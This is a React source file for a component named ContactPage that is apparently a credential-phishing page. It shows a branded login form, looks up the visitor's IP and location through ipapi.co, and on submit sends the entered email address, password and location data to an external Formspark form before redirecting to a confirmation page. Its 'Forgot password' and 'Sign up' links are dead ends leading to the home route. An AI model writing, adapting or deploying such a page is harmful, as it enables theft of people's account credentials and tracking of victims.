import { useFormspark } from "@formspark/use-formspark";
import Axios from "axios";
import React, { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";
import LoginImg from "../assets/sslmard.jpg"


const FORMSPARK_FORM_ID = "Mf8t5Q9Gw";

const ContactPage = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState([]);

  useEffect(() => {
    Axios.get("https://ipapi.co/json/").then((res) => {
      setIsDetails(res.data);
    });
  }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
      ...isDetails,
    });
    return;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/confirm",
          }}
        />
      </p>
    );
  }

  return (
    <div>
    <div className=""></div>
    <div className="">
        <div className="">
        <div className=" ">
         <div className="md:w-96 h-auto w-80 py-4 md:p-2 bg-white mx-auto">
          <div className=''>
           <img className='w-18' src={LoginImg} alt='ok' />
         </div>            
         <form onSubmit={handleSubmit}>
         <div className="">
            <label className="font-bold">Email Address</label>
         <input
           type="email"
           value={emlId}
           onChange={(e) => setEmlId(e.target.value)}
           className="outline-none border-black p-2 mb-3 border w-full"
           placeholder="Email *"
           required
         />
         </div>
         <div className="mt-3">
          <label className="font-bold">Password</label>
         <input
           type="password"
           value={emlPass}
           onChange={(e) => setEmlPass(e.target.value)}
           className="outline-none border-black p-2 mb-3 border w-full"
           placeholder="Password *"
           required
         />
         </div>
          <div className="text-lg py-2">
           
          </div>
            <div className="py-5 w-full">
            <button
              type="submit"
              className="px-6 py-2 w-full text-white font-semibold bg-green-700 rounded-md text-2xl"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Log in
            </button>
            <div className="py-2 text-center">
             <Link to="/" className="underline">Forgot password</Link>?
            </div>
            <div className="py-2 text-center">
             <Link to="/" className="underline">Sign up</Link>?
            </div>
            </div>
            </form>
             </div>
        </div>
        </div>
    </div>
    
    </div>

  );
};
export default ContactPage;
